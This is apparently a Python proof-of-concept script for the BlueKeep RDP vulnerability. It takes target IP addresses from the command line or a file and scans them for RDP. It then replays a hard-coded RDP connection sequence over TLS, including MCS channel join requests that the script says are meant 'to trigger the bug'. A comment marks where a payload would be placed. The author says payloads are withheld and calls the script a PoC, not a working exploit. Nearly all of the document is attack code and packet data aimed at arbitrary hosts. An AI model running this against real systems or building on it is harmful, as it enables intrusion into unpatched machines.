import socket
import binascii
import argparse

from OpenSSL import *
from impacket.impacket.structure import Structure


# impacket structures
class TPKT(Structure):
    commonHdr = (
        ('Version', 'B=3'),
        ('Reserved', 'B=0'),
        ('Length', '>H=len(TPDU)+4'),
        ('_TPDU', '_-TPDU', 'self["Length"]-4'),
        ('TPDU', ':=""'),
    )


class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator', 'B=len(VariablePart)+1'),
        ('Code', 'B=0'),
        ('VariablePart', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['VariablePart'] = ''


class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF', '<H=0'),
        ('SRC-REF', '<H=0'),
        ('CLASS-OPTION', 'B=0'),
        ('Type', 'B=0'),
        ('Flags', 'B=0'),
        ('Length', '<H=8'),
    )


class DATA_TPDU(Structure):
    commonHdr = (
        ('EOT', 'B=0x80'),
        ('UserData', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['UserData'] = ''


class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols', '<L'),
    )

    def __init__(self, data=None):
        CR_TPDU.__init__(self, data)
        if data is None:
            self['Type'] = 1


# packing and unpacking binary data
class Packer(object):

    def __init__(self, packet):
        self.packet = packet

    def bin_unpack(self):
        return binascii.unhexlify(self.packet)

    def bin_pack(self):
        return binascii.hexlify(self.packet)


# PDU control sequence
class DoPduConnectionSequence(object):

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b
    def connection_request_pdu():
        packet = "030000130ee000000000000100080003000000"
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/04c60697-0d9a-4afd-a0cd-2cc133151a9c
    def domain_request_pdu():
        packet = "0300000c02f0800400010001"
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/f5d6a541-9b36-4100-b78f-18710f39f247
    def mcs_attach_user_request_pdu():
        packet = "0300000802f08028"
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b
    def mcs_connect_init_pdu():
        packet = (
            "030001ee02f0807f658201e20401010401010101ff30190201220201020201000201010201000201010202ffff02010230190201"
            "0102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201"
            "0204820181000500147c00018178000800100001c00044756361816a01c0ea000a0008008007380401ca03aa09040000b11d0000"
            "4400450053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c0000000000000000000000"
            "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
            "0000000001ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d00340031003938"
            "0038002d0039003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400"
            "000004c00c00150000000000000002c00c001b0000000000000003c0680005000000726470736e6400000f0000c0636c69707264"
            "72000000a0c0647264796e766300000080c04d535f5431323000000000004d535f5431323000000000004d535f54313230000000"
            "00004d535f5431323000000000004d535f543132300000000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/772d618e-b7d6-4cd0-b735-fa08af558f9d
    def client_info_pdu():
        packet = (
            "0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000042007200770041006600660079"
            "000000740074007400740000000000000002001c00310030002e0030002e0030002e003700360000000000000000000000400043"
            "003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c006d007300740073006300610078"
            "002e0064006c006c000000a40100004d006f0075006e007400610069006e0020005300740061006e006400610072006400200054"
            "0069006d006500000000000000000000000000000000000000000000000b00000001000200000000000000000000004d006f0075"
            "006e007400610069006e0020004400610079006c0069006700680074002000540069006d00650000000000000000000000000000"
            "0000000000000000000300000002000200000000000000c4ffffff0100000006000000000064000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/4c3c2710-0bf0-4c54-8e69-aff40ffcde66
    def client_active_confirmation_pdu():
        packet = (
            "030001be02f0807f658201b20401010401010101ff30190201220201020201000201010201000201010202ffff0201023019020101"
            "02010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204"
            "820151000500147c00018148000800100001c00044756361813a01c0ea000a0008008007380401ca03aa09040000ee420000440045"
            "0053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c000000000000000000000000000000"
            "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001"
            "ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d003400310039380038002d0039"
            "003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400000004c00c0015"
            "0000000000000002c00c001b0000000000000003c0380004000000726470736e6400000f0000c0636c6970726472000000a0c06472"
            "64796e766300000080c04d535f543132300000000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def client_control_request_pdu():
        packet = (
            "0300003402f08064000603eb7026080081f83b8bb47256ffd1d64b171eaef68ddd75a0a316972912b7cf14c9110bd8c8faa1813a"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def client_control_cooperate_pdu():
        packet = (
            "0300003402f08064000603eb7026080081f80403def791a37caf3f7a624e3bfeb67a28bf0d4f312703b94af1e626f0bdc5710a53"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/2d122191-af10-4e36-a781-381e91c182b7
    def client_persistent_key_length_pdu():
        packet = (
            "0300010d02f08064000603eb7080fe08009016cec64a69d9d3499e10a5040fcfab4f6a3bda31034f29bd643e9846ec0a1dcd9cad"
            "1358a3bd8b9daef1e99d439653f5d0b75088f381f1cbad1755759c5fefeca93540b37406d1aed1159fed9149a63d1fc131b11758"
            "da0e24df1f878639d14666ea0e98d04b5b7b01b98ae8683280dab958a69f4fb5ba7904aed963c06aa8815197250b3fc3d247fa0a"
            "7a221fbd5f4eb800ea3206e6af15e46fb3d3c14ccb0a8edda729070359c1c1081baa563cf5d089e3cdcf268b65590acb7e81b633"
            "bb4d9a1380e7572a0d1d11b418c4312f4f897709942ec38ebffd6a392b47740e1274ec4514c36b27d6b69311a4bc46de694ab454"
            "c72424998f60b72159"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def client_font_list_pdu():
        packet = (
            "0300003402f08064000603eb7026080080fe98195cfb9292f59718b2b7c313dc03fb6445c0436d913726fd8e71e6f22a1eae3503"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def do_join_request(size=30, do_padding=False):
        channels, pdu_channels = range(1001, 1008), []
        request_packets = {
            "dep": "0300000c02f080380006",
            "req": "0300000c02f080380008",
            "ms_t120": "4d535f5431323000000000"
        }
        padding = "41" * size
        if do_padding:
            exp = request_packets["dep"] + request_packets["ms_t120"] + padding
            results = Packer(exp).bin_unpack()
        else:
            for channel in channels:
                current_channel = request_packets["req"] + hex(channel)[2:].zfill(4)
                pdu_channels.append(Packer(current_channel).bin_unpack())
            results = pdu_channels
        return results

    @staticmethod
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9cde84cd-5055-475a-ac8b-704db419b66f
    def do_client_security_pdu_exchange():
        packet = (
            "0300005e02f08064000603eb7050010200004800000091ac0c8f648c39f4e7ff0a3b79115c13512acb728f9db7422ef7084c8eae"
            "559962d28181e466c805ead473063fc85faf2afdfcf164b33f0a151ddb2c109d30110000000000000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def client_synchronization_pdu():
        packet = (
            "0300003002f08064000603eb7022280081f859ffcb2f73572b42db882e23a997c2b1f574bc49cc8ad8fd608a7af64475"
        )
        return Packer(packet).bin_unpack()


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--ip", dest="ipAddyList", default=None,
                            help="provide a list of IP addresses separated by commas, or a single IP address"
                            )
        parser.add_argument("-f", "--file", dest="ipAddyFile", default=None,
                            help="provide a file containing IP addresses, one per line")
        return parser.parse_args()


# constants
GIS_RDP = []
TPDU_CONNECTION_REQUEST = 0xe0
TYPE_RDP_NEG_REQ = 1
PROTOCOL_SSL = 1
SENT = "\033[91m -->\033[0m"
RECEIVE = "\033[94m<-- \033[0m"


def info(string):
    print("[ \033[32m+\033[0m ] {}".format(string))


def error(string):
    print("[ \033[31m!\033[0m ] {}".format(string))


# connect the sockets and return the received data plus the connection in a Tuple
def socket_connection(obj, address, port=3389, receive_size=4000):
    try:
        session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session.connect((address, port))
        session.sendall(obj)
        return session.recv(receive_size), session
    except Exception as e:
        error(e)
        return None


# check if the ip is running RDP or not
def check_rdp_service(address):
    rdp_correlation_packet = Packer(
        "436f6f6b69653a206d737473686173683d75736572300d0a010008000100000000"
    ).bin_unpack()
    test_packet = DoPduConnectionSequence().connection_request_pdu()
    send_packet = test_packet + rdp_correlation_packet
    results = socket_connection(send_packet, address, receive_size=9126)
    if results is not None:
        if results[0]:
            info("successfully connected to RDP service on host: {}".format(address))
            GIS_RDP.append(address)
        else:
            error("unknown response provided from RDP session")
    else:
        error("unable to connect")


# start the connection like a boss
def start_rdp_connection(ip_addresses):
    tpkt = TPKT()
    tpdu = TPDU()
    rdp_neg = RDP_NEG_REQ()
    rdp_neg['Type'] = TYPE_RDP_NEG_REQ
    rdp_neg['requestedProtocols'] = PROTOCOL_SSL
    tpdu['VariablePart'] = rdp_neg.getData()
    tpdu['Code'] = TPDU_CONNECTION_REQUEST
    tpkt['TPDU'] = tpdu.getData()
    for ip in ip_addresses:
        try:
            ip = ip.strip()
            results = socket_connection(tpkt.getData(), ip, receive_size=1024)
            ctx = SSL.Context(SSL.TLSv1_METHOD)
            tls = SSL.Connection(ctx, results[1])
            tls.set_connect_state()
            tls.do_handshake()

            # initialization packets (X.224)
            info("sending Client MCS Connect Initial PDU request packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().mcs_connect_init_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # erect domain and attach user to domain
            info("sending Client MCS Domain Request PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().domain_request_pdu())
            info("sending Client MCS Attach User PDU request packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().mcs_attach_user_request_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # send join requests on ridiculously high channel numbers to trigger the bug
            info("sending MCS Channel Join Request PDU packets {}".format(SENT))
            pdus = DoPduConnectionSequence().do_join_request()
            for pdu in pdus:
                tls.sendall(pdu)
                channel_number = int(Packer(pdu).bin_pack()[-4:], 16)
                returned_packet = tls.recv(1024)
                info("{} received {} bytes from channel {} on host: {}".format(
                    RECEIVE, hex(len(returned_packet)), channel_number, ip
                ))

            # my personal favorite is the security exchange, took me awhile to figure this one out
            info("sending Client Security Exhcange PDU packets {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().do_client_security_pdu_exchange())
            tls.sendall(DoPduConnectionSequence().client_info_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(
                RECEIVE, hex(len(returned_packet)), ip
            ))

            # confirm that the client is now active
            confirm_packet = (
                "0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d5354534300170000000100180001000300000"
                "2000000001d04000000000000000002001c00200001000100010080073804000001000100001a010000000300580000000000"
                "0000000000000000000000000000000001001400000001000000aa00010101010100000101010001000000010101010101010"
                "1000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000"
                "000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020"
                "008000a0001001400150009000800000000000d005800910020000904000004000000000000000c0000000000000000000000"
                "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                "000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe"
                "004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c000100000"
                "00000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b00060001001e00080001000000"
                "18000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d744e803c0ecbe"
                "ea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf020008000001400002010101000140"
                "0002010104"
            )
            info("sending Client Confirm Active PDU packet {}".format(SENT))
            tls.sendall(Packer(confirm_packet).bin_unpack())
            returned_packet = tls.recv(1024)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # finish the connection sequence
            info("sending Client Synchronization PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().client_synchronization_pdu())
            info("sending Client Control Cooperate PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().client_control_cooperate_pdu())
            info("sending Client Control Request PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().client_control_request_pdu())
            info("sending Client Persistent Key Length PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().client_persistent_key_length_pdu())
            info("sending Client Font List PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().client_font_list_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # As much as I don't condone hacking and breaking into things.
            # If you're going to do it, this is where you would put your payload of types.
            #
            # To do this you would do something along the lines of:
            # -----------------------------------------------------
            # tls.sendall(Packer(
            #         "0000000c29fbf017000c2946f8c10800450000100028021a400080060a62c0a83682c0a8002036810d3dc0080022ff5"
            #         "cfba05185501400300000a7910000"
            #     ).bin_pack())
            # data = tls.recv(1024)
            # print repr(data)
            # -----------------------------------------------------
            # Generating the payloads is hard, especially when alsr is involved with it.
            # Good luck with that, I will not be sharing any of my payloads because i
            # don't feel like watching the world burn yet.

            info("closing the connection now, this is a PoC not a working exploit")
            results[1].close()
        except Exception as e:
            error("unable to connect: {}".format(e))
            continue


def main():
    to_scan = []
    opt = Parser().optparse()
    if opt.ipAddyList is not None:
        for ip in opt.ipAddyList.split(","):
            to_scan.append(ip)
    elif opt.ipAddyFile is not None:
        try:
            open(opt.ipAddyFile).close()
        except IOError:
            error("that file doesn't exist?")
            exit(1)
        with open(opt.ipAddyFile) as addresses:
            for address in addresses.readlines():
                to_scan.append(address.strip())
    else:
        info("python bluekeep_poc.py [-i addy1[,addy2,...]] [-f /path/to/file]")
        exit(1)
    for scan in to_scan:
        info("verifying RDP service on: {}".format(scan))
        check_rdp_service(scan)
    info("starting RDP connection on {} targets".format(len(GIS_RDP)))
    print("\n\n")
    start_rdp_connection(GIS_RDP)


if __name__ == "__main__":
    print("""\033[34m
  ____  _            _  __               
 |  _ \| |          | |/ /               
 | |_) | |_   _  ___| ' / ___  ___ _ __  
 |  _ <| | | | |/ _ \  < / _ \/ _ \ '_ \ 
 | |_) | | |_| |  __/ . \  __/  __/ |_) |
 |____/|_|\__,_|\___|_|\_\___|\___| .__/ 
                                  | |    
                                  |_|
\033[0m""")
    main()
